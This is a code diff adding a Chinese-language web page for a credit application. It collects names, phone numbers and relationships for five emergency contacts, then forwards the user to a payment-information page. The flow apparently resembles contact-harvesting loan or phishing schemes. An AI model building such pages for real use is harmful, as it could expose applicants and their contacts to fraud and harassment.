@@ -1,1 +1,50 @@
-
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>添加联系人</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header-logo">
+            <svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M16,13C15.71,13 15.38,13.07 15.07,13.21L8.83,9.88C8.93,9.59 9,9.3 9,9A3,3 0 0,0 6,6A3,3 0 0,0 3,9A3,3 0 0,0 6,12C6.3,12 6.59,11.93 6.88,11.82L13.12,15.17C13.07,15.42 13,15.71 13,16A3,3 0 0,0 16,19A3,3 0 0,0 19,16A3,3 0 0,0 16,13M16,17.9A1.9,1.9 0 0,1 14.1,16A1.9,1.9 0 0,1 16,14.1A1.9,1.9 0 0,1 17.9,16A1.9,1.9 0 0,1 16,17.9M6,10.9A1.9,1.9 0 0,1 4.1,9A1.9,1.9 0 0,1 6,7.1A1.9,1.9 0 0,1 7.9,9A1.9,1.9 0 0,1 6,10.9Z" /></svg>
+        </div>
+        <h2>请填写紧急联系人</h2>
+        <p>您的信息将被严格保密，仅用于本次授信评估</p>
+        <form id="contacts-form" style="text-align: left;">
+            <script>
+                for (let i = 1; i <= 5; i++) {
+                    document.write(`
+                        <div class="contact-block">
+                            <h3>联系人 ${i}</h3>
+                            <label for="name${i}">姓名</label>
+                            <input type="text" id="name${i}" placeholder="联系人姓名" required>
+                            <label for="phone${i}">电话</label>
+                            <input type="tel" id="phone${i}" placeholder="联系人手机号" required>
+                            <label for="relation${i}">关系</label>
+                            <select id="relation${i}" required>
+                                <option value="">请选择关系</option>
+                                <option value="parent">父母</option>
+                                <option value="spouse">配偶</option>
+                                <option value="child">子女</option>
+                                <option value="sibling">兄弟姐妹</option>
+                                <option value="friend">朋友</option>
+                                <option value="colleague">同事</option>
+                            </select>
+                        </div>
+                    `);
+                }
+            </script>
+            <button type="submit" style="margin-top: 15px;">下一步</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('contacts-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            window.location.href = 'payment-info.html' + window.location.search;
+        });
+    </script>
+</body>
+</html>
